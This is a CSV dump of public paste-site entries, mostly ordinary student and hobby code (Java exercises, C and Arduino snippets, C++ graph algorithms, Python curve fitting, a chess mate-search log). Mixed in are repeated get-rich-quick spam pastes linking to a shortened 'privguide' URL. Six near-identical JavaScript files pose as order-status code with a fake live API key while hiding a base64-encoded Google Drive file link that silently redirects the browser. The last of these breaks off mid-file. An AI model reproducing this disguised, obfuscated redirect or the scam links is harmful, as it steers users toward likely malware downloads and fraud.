id,title,username,language,date,content
XyvWFi8b,EARN $900 INSTANTLY 2025⭐ G8,ATrollerLinker,JavaScript,Monday 14th of April 2025 01:01:11 PM CDT," 
Pdf https://tinyurl.com/privguidee


b7uZPn7Zku
"
qngFy0Gu,Make $1000 15-MINUTES  (BEGINNER) HV,ATrollerLinker,JavaScript,Monday 14th of April 2025 12:47:47 PM CDT," 
Pdf https://tinyurl.com/privguidee


bDQyYLqP5y
"
m1ufRYPv,[NP] Quiz,dzocesrce,Java,Monday 14th of April 2025 12:41:25 PM CDT,"import java.io.PrintStream;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.IntSummaryStatistics;
import java.util.List;
import java.util.stream.IntStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class QuizTest {
    public static void main(String[] args) {

        Scanner sc = new Scanner(System.in);

        Quiz quiz = new Quiz();

        int questions = Integer.parseInt(sc.nextLine());

        for (int i=0;i<questions;i++) {
            try {
                quiz.addQuestion(sc.nextLine());
            } catch (InvalidOperationException e) {
                System.out.println(e.getMessage());
            }
        }

        List<String> answers = new ArrayList<>();

        int answersCount =  Integer.parseInt(sc.nextLine());

        for (int i=0;i<answersCount;i++) {
            answers.add(sc.nextLine());
        }

        int testCase = Integer.parseInt(sc.nextLine());

        if (testCase==1) {
            quiz.printQuiz(System.out);
        } else if (testCase==2) {
            try {
                quiz.answerQuiz(answers, System.out);
            } catch (InvalidOperationException e) {
                System.out.println(e.getMessage());
            }
        } else {
            System.out.println(""Invalid test case"");
        }
    }
}

class InvalidOperationException extends Exception{
    public InvalidOperationException(String message) {
        super(message);
    }
}

abstract class Question implements Comparable<Question> {
    private String name;
    private int points;
    private Type type;

    public Question(String name, int points) {
        this.name = name;
        this.points = points;
    }

    public String getName() {
        return name;
    }

    public int getPoints() {
        return points;
    }

    public abstract String getAnswer();

    public abstract Type getType();

}

class MultipleChoiceQuestion extends Question{
    private char answer;
    public MultipleChoiceQuestion(String name, int points, char answer) {
        super(name, points);
        this.answer=answer;
    }

    public String getAnswer() {
        return String.valueOf(answer);
    }

    @Override
    public Type getType() {
        return Type.MC;
    }

    @Override
    public String toString() {
        return String.format(""Multiple Choice Question: %s Points %d Answer: %c"",super.getName(),super.getPoints(),answer);
    }

    @Override
    public int compareTo(Question o) {
        return Integer.compare(super.getPoints(),o.getPoints());
    }
}

class TrueFalseQuestion extends Question{
    private boolean answer;

    public TrueFalseQuestion(String name, int points,boolean answer) {
        super(name, points);
        this.answer=answer;
    }

    public String getAnswer() {
        return String.valueOf(answer);
    }

    @Override
    public Type getType() {
        return Type.TF;
    }

    @Override
    public String toString() {
        return String.format(""True/False Question: %s Points: %d Answer: %s"",super.getName(),super.getPoints(),answer);
    }

    @Override
    public int compareTo(Question o) {
        return Integer.compare(super.getPoints(),o.getPoints());
    }
}

enum Type {
    MC,
    TF
}


class Quiz {
    List<Question> questions;

    public Quiz() {
        this.questions = new ArrayList<>();
    }

    public int checkAnswer(char c){
        return ""ABCDE"".indexOf(c);
    }

    public void addQuestion(String s) throws InvalidOperationException {
        String[] parts= s.split("";"");
        String name= parts[1];
        int points= Integer.parseInt(parts[2]);
        String answer= parts[3];
        if(parts[0].equals(""MC"")){
            if(checkAnswer(answer.charAt(0))==-1)
                throw new InvalidOperationException(answer.charAt(0)+"" is not allowed option for this question"");
            questions.add(new MultipleChoiceQuestion(name,points,answer.charAt(0)));
        }
        else{
            questions.add(new TrueFalseQuestion(name,points,Boolean.parseBoolean(parts[3])));
        }
    }

    public void printQuiz(PrintStream out) {
        PrintWriter printWriter = new PrintWriter(out);

        questions.stream().sorted(Comparator.reverseOrder()).forEach(i->printWriter.println(i));
        printWriter.flush();
    }



    public void answerQuiz(List<String> answers, PrintStream out) throws InvalidOperationException {
        PrintWriter printWriter = new PrintWriter(out);
        if(answers.size()!= questions.size())
            throw new InvalidOperationException(""Answers and questions must be of same length!"");
        double totalPoints=0;
        for(int i=0; i<answers.size();i++){
            if(questions.get(i).getAnswer().equals(answers.get(i))) {
                printWriter.println(String.format(""%d. %.2f"", i+1,(double) questions.get(i).getPoints()));
                totalPoints += questions.get(i).getPoints();
            }
            else{
                if(questions.get(i).getType().equals(Type.MC)){
                    printWriter.println(String.format(""%d. %.2f"",i+1,(double) questions.get(i).getPoints()*0.2*(-1)));
                    totalPoints-=questions.get(i).getPoints()*0.2;
                }
                else{
                    printWriter.println(String.format(""%d. 0.00"",i+1));
                }

            }
        }
        printWriter.println(String.format(""Total points: %.2f"",totalPoints));
        printWriter.flush();
    }
}"
0LfN8AK7,Make $1000 15-MINUTES  (BEGINNER) HV,nihjae45,JavaScript,Monday 14th of April 2025 12:34:15 PM CDT," 
Pdf https://tinyurl.com/privguidee


vnfJvAvVGZ
"
gfRZqiCT,CortexM0 GPO LED,Dani_info,C,Monday 14th of April 2025 12:33:44 PM CDT,"#include <MKL25Z4.h>

//red -> PTB18

#define MASK(x) (1UL << (x))

int main(){
	SIM->SCGC5|=SIM_SCGC5_PORTB_MASK; //enable clock 
	PORTB->PCR[18]&=~PORT_PCR_MUX_MASK; // clear PCR
	PORTB->PCR[18]|=PORT_PCR_MUX(1); //set PB19 as GPIO (MUX1)
	PTB->PDDR|=MASK(18); // set PDDR[18]=1 -> output
	PTB->PSOR=~MASK(18); // set PSOR[18]=0 -> set GPO PB19 LOW to turn on the active LOW LED 
	while (1)
		;
	return 0;
}"
zS46rh3A,EARN $900 INSTANTLY 2025 2U,nihjae45,JavaScript,Monday 14th of April 2025 12:20:50 PM CDT," 
Pdf https://tinyurl.com/privguidee


Va8ZGZLtsN
"
5JDm9ra7,Make $1000 15-MINUTES (BEGINNER) FM,nihjae45,JavaScript,Monday 14th of April 2025 12:07:25 PM CDT," 
Pdf https://tinyurl.com/privguidee


tNzUEbxc3O
"
zrDFg95p,clone deep copy,STANAANDREY,C,Monday 14th of April 2025 11:45:39 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NMAX 100
typedef struct {
  int id;
  char name[NMAX];
} Entity;

Entity cloneEntity(const Entity *const ep) {
  Entity aux;
  aux.id = ep->id;
  strncpy(aux.name, ep->name, NMAX);
  return aux;
}

void printEntity(const Entity *const ep) {
  printf(""{ id: %d, name: %s }\n"", ep->id, ep->name);
}

int main(void) {
  Entity e1 = {.id = 1, .name = ""asd""}, e2;
  e2 = cloneEntity(&e1);
  strcat(e2.name, ""123"");
  printEntity(&e1);
  printEntity(&e2);
  return 0;
}"
MiUiLeEv,Lesson 1 - Base,MCreeper12731,Python,Monday 14th of April 2025 11:40:27 AM CDT,"import pygame
pygame.init()
pygame.font.init()

width = 1200
height = 600
window = pygame.display.set_mode((width, height))
pygame.display.set_caption(""Game Title"")

# Class definitions and variables


# Main game loop
clock = pygame.time.Clock()
running = True
while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

    window.fill((255, 255, 255))

    # Moving and drawing
    
    pygame.display.update()
    clock.tick(60)

pygame.quit()"
qGkLifpK,Untitled,dllbridge,C,Monday 14th of April 2025 11:25:56 AM CDT,"void setup() 
{
  Serial.begin(9600);                               // Открываем порт на 9600 бод
  pinMode(LED_BUILTIN, OUTPUT);
}

void loop() 
{
  if (Serial.available() > 0)                       // Если пришли данные
  {
    String command = Serial.readStringUntil('\n');  // Читаем до символа новой строки
    command.trim();                                 // Удаляем лишние пробелы и символы

    if (command == ""Are_you_Arduino?"")              // Обработка команд
    {
      digitalWrite(LED_BUILTIN, HIGH);
      Serial.println(""S_ _Y. Yes, it's Arduino !"");
      delay(50);
      digitalWrite(LED_BUILTIN, LOW);
      return;
    } 

    if (command == ""LED_ON"") 
    {
      digitalWrite(LED_BUILTIN, HIGH);
      Serial.println(""LED is ON"");
    } 
    else if (command == ""LED_OFF"") 
    {
      digitalWrite(LED_BUILTIN, LOW);
      Serial.println(""LED is OFF"");
    } 
    else if (command == ""GET_TEMP"") 
    { 
      float temp = 25.5 + (rand() % 10) / 10.0;       // Пример: возвращаем ""фейковую"" температуру
      Serial.print(""TEMP:"");
      Serial.println(temp, 1);                        // Одна цифра после запятой
    } 
    else {
      Serial.print(""UNKNOWN: "");
      Serial.println(command);
    }
  }
}"
3b6UF2Xj,Untitled,x2LeaF,JavaScript,Monday 14th of April 2025 11:14:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/75870/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2UzTfwF6,checkmate in 11,max2201111,Python,Monday 14th of April 2025 11:09:21 AM CDT,"Analyzing position: 8/8/8/q7/2k1R3/8/8/3K4 b - - 0 1

Initial position:
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 q . . . . . . . 5
4 . . k . R . . . 4
3 . . . . . . . . 3
2 . . . . . . . . 2
1 . . . K . . . . 1
  a b c d e f g h
Side to move: Black

No checkmate in one move found.
Proceeding with deeper search...
Searching for mate in 1 moves...
Depth 1 completed in 0.0020 seconds
Searching for mate in 2 moves...
Depth 2 completed in 0.0056 seconds
Searching for mate in 3 moves...
Depth 3 completed in 0.0477 seconds
Searching for mate in 4 moves...
Depth 4 completed in 0.1853 seconds
Searching for mate in 5 moves...
Depth 5 completed in 1.5417 seconds
Searching for mate in 6 moves...
Depth 6 completed in 4.9635 seconds
Searching for mate in 7 moves...
Depth 7 completed in 42.0163 seconds
Searching for mate in 8 moves...
Depth 8 completed in 118.7615 seconds
Searching for mate in 9 moves...
Depth 9 completed in 1461.1566 seconds
Searching for mate in 10 moves...
Depth 10 completed in 25845.2522 seconds
Searching for mate in 11 moves...
Depth 11 completed in 58850.2191 seconds
Mate in 11 found!

Checkmate sequence found:
Move 1: Black plays kc4-d3
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 q . . . . . . . 5
4 . . . . R . . . 4
3 . . . k . . . . 3
2 . . . . . . . . 2
1 . . . K . . . . 1
  a b c d e f g h
Move 2: White plays Re4-d4
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 q . . . . . . . 5
4 . . . R . . . . 4
3 . . . k . . . . 3
2 . . . . . . . . 2
1 . . . K . . . . 1
  a b c d e f g h
Move 3: Black plays kd3-d4
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 q . . . . . . . 5
4 . . . k . . . . 4
3 . . . . . . . . 3
2 . . . . . . . . 2
1 . . . K . . . . 1
  a b c d e f g h
Move 4: White plays Kd1-e2
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 q . . . . . . . 5
4 . . . k . . . . 4
3 . . . . . . . . 3
2 . . . . K . . . 2
1 . . . . . . . . 1
  a b c d e f g h
Move 5: Black plays qa5-f5
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . q . . 5
4 . . . k . . . . 4
3 . . . . . . . . 3
2 . . . . K . . . 2
1 . . . . . . . . 1
  a b c d e f g h
Move 6: White plays Ke2-d2
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . q . . 5
4 . . . k . . . . 4
3 . . . . . . . . 3
2 . . . K . . . . 2
1 . . . . . . . . 1
  a b c d e f g h
Move 7: Black plays qf5-f2
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . . . . 5
4 . . . k . . . . 4
3 . . . . . . . . 3
2 . . . K . q . . 2
1 . . . . . . . . 1
  a b c d e f g h
Move 8: White plays Kd2-c1
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . . . . 5
4 . . . k . . . . 4
3 . . . . . . . . 3
2 . . . . . q . . 2
1 . . K . . . . . 1
  a b c d e f g h
Move 9: Black plays kd4-c3
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . . . . 5
4 . . . . . . . . 4
3 . . k . . . . . 3
2 . . . . . q . . 2
1 . . K . . . . . 1
  a b c d e f g h
Move 10: White plays Kc1-b1
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . . . . 5
4 . . . . . . . . 4
3 . . k . . . . . 3
2 . . . . . q . . 2
1 . K . . . . . . 1
  a b c d e f g h
Move 11: Black plays qf2-b2
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . . . . 5
4 . . . . . . . . 4
3 . . k . . . . . 3
2 . q . . . . . . 2
1 . K . . . . . . 1
  a b c d e f g h
Checkmate! Black wins.

Total analysis time: 227994.4939 seconds"
meyu0Zzf,Untitled,GregLeblanc,Python,Monday 14th of April 2025 11:05:18 AM CDT,"# Define a generic gaussian function
def gauss_lin(x, *params):
    """"""
    This defines a generic gaussiann function plus a linear background, with 
    an arbitrary number of peaks.  Pass the X values and a pointer to your 
    initial guesses.
    Make sure that guesses are in the order of slope, intercept, amplitude, 
    mean, and sigma, and that you have a multiple of 2+3n guesses to pass in.  
    
    Parameters
    ----------
    x : independent variable
    params : parameters for the Gaussian function
        - slope: slope of the linear background
        - intercept: y-intercept of the linear background
        - amplitude: height of the peak
        - mean: position of the center of the peak
        - sigma: width of the peak
        - (repeat for multiple peaks)
    
    Returns
    -------
    y : dependent variable
    """"""
    y = np.zeros_like(x)
    slope = params[0]
    intercept = params[1]
    y += slope * x + intercept
    for i in range(2, len(params), 3):
        amplitude = params[i]
        mean = params[i + 1]
        sigma = params[i + 2]
        y += amplitude * np.exp(-(( x - mean) ** 2) / (2 * sigma ** 2))
    return y
# End of gauss_lin"
VeEhSyrf,Products.js,hubertzoo90,JavaScript,Monday 14th of April 2025 10:59:07 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/27903/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4zdLBFiR,Untitled,Josif_tepe,C++,Monday 14th of April 2025 10:55:51 AM CDT,"#include <iostream>
#include <vector>
#include <queue>
using namespace std;
struct node {
    int idx, shortest_time, money;
    node () {}
    node(int _idx, int _shortest_time, int _money) {
        idx = _idx;
        shortest_time = _shortest_time;
        money = _money;
    }
    
    bool operator < (const node & tmp) const {
        if(shortest_time == tmp.shortest_time) {
            return money > tmp.money;
        }
        return shortest_time > tmp.shortest_time;
    }
   
};

int main() {
    return 0;
}
"
GaYj8GbN,Webserver with Loopback interface only,metalx1000,Bash,Monday 14th of April 2025 10:49:48 AM CDT,"mkdir www
cd www

# create index web page and start server
echo ""Hello"" > index.html
busybox httpd -vf -p8888

# check connection with client
wget -qO- ""http://127.0.0.1:8888""
wget -qO- ""http://localhost:8888""
wget -qO- ""http://192.168.1.158:8888""
brave ""http://127.0.0.1:8888""
brave ""http://localhost:8888""
brave ""http://192.168.1.158:8888""

# create httpd webserver config file with restrictions
# busybox will look for httpd.conf in current directory
# or you can tell it to look for it in a set place
echo ""A:127.0.0.1"" > httpd.conf
echo 'D:*' >> httpd.conf
busybox httpd -vfc httpd.conf -p8888

# check connection with client
wget -qO- ""http://127.0.0.1:8888""
wget -qO- ""http://localhost:8888""
wget -qO- ""http://192.168.1.158:8888""
brave ""http://127.0.0.1:8888""
brave ""http://localhost:8888""
brave ""http://192.168.1.158:8888"""
8PrkxmnC,Untitled,GregLeblanc,Python,Monday 14th of April 2025 10:46:57 AM CDT,"
    def fit_peaks(self, type, initial_guesses):
        """"""
        Fit the data to a specified function.
        
        Parameters:
        initial_guesses (tuple): Initial guesses for the fit parameters.
        
        Returns:
        tuple: Fitted parameters and covariance matrix.
        """"""
        parameters = getattr(self, f""{type}_parameters"")
        x = getattr(self, f""{type}_channel"")
        y = getattr(self, f""{type}_counts"")
          
        # Fit the data to the specified function
        popt, pcov = curve_fit(gauss_lin, 
                               x, 
                               y,
                               p0=initial_guesses)
        # print(f""Linear background is: y= {popt[0]:.2f}x + {popt[1]:.2f}"")
        
        parameters = popt

        peak_amplitude = getattr(self, f""{type}_peak_amplitude"")
        peak_mean = getattr(self, f""{type}_peak_mean"")
        peak_sigma = getattr(self, f""{type}_peak_sigma"")

        for i in range(2, len(popt), 3):
            peak_amplitude.append(popt[i])
            peak_mean.append(popt[i + 1])
            peak_sigma.append(popt[i + 2])"
r0rLP0LG,Order.js,hubertzoo90,JavaScript,Monday 14th of April 2025 10:43:46 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37324/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fMvh2rUj,Untitled,Josif_tepe,C++,Monday 14th of April 2025 10:39:10 AM CDT,"#include <iostream>
#include <vector>
#include <queue>
using namespace std;
struct node {
    int idx, shortest_path;
    node() {}
    node(int _idx, int _shortest_path) {
        idx = _idx;
        shortest_path = _shortest_path;
    }
    
    bool operator < (const node & tmp) const {
        return shortest_path > tmp.shortest_path;
    }
};

int main() {
    int n, V;
    cin >> n >> V;
    
    vector<int> portals(n);
    for(int i = 0; i < n; i++) {
        cin >> portals[i];
    }
    priority_queue<node> pq;
    pq.push(node(0, 0));
    vector<bool> visited(n, false);
    vector<bool> portal_visited(11, false);
    
    while(!pq.empty()) {
        node current_node = pq.top();
        pq.pop();
        
        if(current_node.idx == n - 1) {
            cout << current_node.shortest_path << endl;
            return 0;
        }
        if(visited[current_node.idx]) {
            continue;
        }
        visited[current_node.idx] = true;
        
        if(current_node.idx + 1 < n) {
            pq.push(node(current_node.idx + 1, current_node.shortest_path + 1));
        }
        if(current_node.idx - 1 >= 0) {
            pq.push(node(current_node.idx - 1, current_node.shortest_path + 1));
        }
        
        if(!portal_visited[portals[current_node.idx]]) {
            for(int i = 0; i < n; i++) {
                if(portals[i] == portals[current_node.idx]) {
                    pq.push(node(i, current_node.shortest_path + V));
                }
            }
            portal_visited[portals[current_node.idx]] = true;
        }
    }
    
    return 0;
}
"
ghFepZyk,[NP] Risk,dzocesrce,Java,Monday 14th of April 2025 10:34:19 AM CDT,"import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Collections;
import java.util.List;
import java.util.stream.Collectors;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.util.stream.Collectors;

class Round {
    private List<Integer> player1;
    private List<Integer> player2;

    public Round(List<Integer> player1, List<Integer> player2) {
        this.player1 = player1;
        this.player2 = player2;
    }

    public List<Integer> getPlayer1() {
        return player1;
    }

    public List<Integer> getPlayer2() {
        return player2;
    }

    public int player1Victorious(){
        for(int i=0;i<3;i++){
            if(player1.get(i)<=player2.get(i))
                return 0;
        }
        return 1;
    }

    public static Round create(String s) {
        String[] parts= s.split("";"");
        List<Integer> player1= new ArrayList<>();
        String[] player1_dices = parts[0].split(""\\s+"");
        for(int i=0;i<3;i++)
            player1.add(Integer.parseInt(player1_dices[i]));
        List<Integer> player2= new ArrayList<>();
        String[] player2_dices = parts[1].split(""\\s+"");
        for(int i=0;i<3;i++)
            player2.add(Integer.parseInt(player2_dices[i]));

        player1= player1.stream().sorted(Comparator.reverseOrder()).collect(Collectors.toList());
        player2= player2.stream().sorted(Comparator.reverseOrder()).collect(Collectors.toList());
        return new Round(player1,player2);
    }

}


class Risk {
    private List<Round> rounds;

    public int processAttacksData(InputStream in) {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));
        this.rounds= bufferedReader.lines().map(i->Round.create(i)).collect(Collectors.toList());

        return rounds.stream().mapToInt(i->i.player1Victorious()).sum();
    }
    
}


public class RiskTester {
    public static void main(String[] args) {

        Risk risk = new Risk();

        System.out.println(risk.processAttacksData(System.in));

    }
}"
xG18FxVn,14-4-25 ordenarVector,Aluneth,C,Monday 14th of April 2025 10:31:21 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <time.h>

void cargarVector(int v1[10])
{

    for (int i = 0; i<10; i++)
    {
        v1[i] = rand() % 10;

    }

}

void imprimirVector(int v1[10])
{

    for (int i = 0; i<10; i++)
    {
        printf(""%d - "", v1[i]);

    }

}

void menor(int v1[10])
{
    int menor = v1[0];
    int seRepite = 0;
    for (int i = 0; i<10-1; i++)
    {

        if (menor == v1[i+1])
        {
            seRepite = 1;
        }

        if (menor>=v1[i+1])
        {
            menor = v1[i+1];
        }
    }
    printf(""El menor es: %d"", menor);
    if (seRepite != 0)
    {
        printf(""\nSe repite el menor"");

    }
}

int main()
{
    srand(time(NULL));
    int vector1[10];
    cargarVector(vector1);
    imprimirVector(vector1);
    menor(vector1);


    // printf(""Hello world!\n"");
    return 0;
}
"
deLxZbY2,Market.js,hubertzoo90,JavaScript,Monday 14th of April 2025 10:28:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/50023/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mi6kRUFN,Untitled,hubertzoo90,JavaScript,Monday 14th of April 2025 10:13:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/01163/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YqC2znA7,Products.js,hubertzoo90,JavaScript,Monday 14th of April 2025 09:57:17 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/43115/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
q4BHyNeF,LCA,Araf_12,C++,Monday 14th of April 2025 09:51:42 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
using namespace std;

const int N = 100005; // Adjust this based on your maximum number of nodes
const int LOG = 24;    // Enough for trees up to 2^24 nodes

vector<int> g[N];
int table[N][LOG];
int depth[N];

void dfs(int u, int p) {
    table[u][0] = p;
    depth[u] = depth[p] + 1;
    
    for(int i = 1; i < LOG; i++) {
        table[u][i] = table[table[u][i-1]][i-1];
    }
    
    for(int v : g[u]) {
        if(v == p) continue;
        dfs(v, u);
    }
}

int find_lca(int u, int v) {
    if(depth[u] > depth[v]) swap(u, v);
    int diff = depth[v] - depth[u];
    
    // Bring v to the same depth as u
    for(int i = 0; i < LOG; i++) {
        if(diff == 0) break;
        if(diff & (1 << i)) {
            v = table[v][i];
            diff -= (1 << i);
        }
    }
    
    if(u == v) return u;
    
    // Now find the LCA
    for(int i = LOG-1; i >= 0; i--) {
        if(table[u][i] != table[v][i]) {
            u = table[u][i];
            v = table[v][i];
        }
    }
    
    return table[u][0];
}

int main() {
    // Example usage:
    int n; // number of nodes
    cin >> n;
    
    // Build the tree (n-1 edges)
    for(int i = 0; i < n-1; i++) {
        int u, v;
        cin >> u >> v;
        g[u].push_back(v);
        g[v].push_back(u);
    }
    
    // Initialize
    depth[0] = -1; // Assuming root is 1 and its parent is 0
    dfs(1, 0);     // Start DFS from root (assuming root is 1)
    
    // Query processing
    int q;
    cin >> q;
    while(q--) {
        int u, v;
        cin >> u >> v;
        cout << ""LCA of "" << u << "" and "" << v << "" is: "" << find_lca(u, v) << endl;
    }
    
    return 0;
}"
gZ2pBCt6,Order.js,hubertzoo90,JavaScript,Monday 14th of April 2025 09:41:54 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71503/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

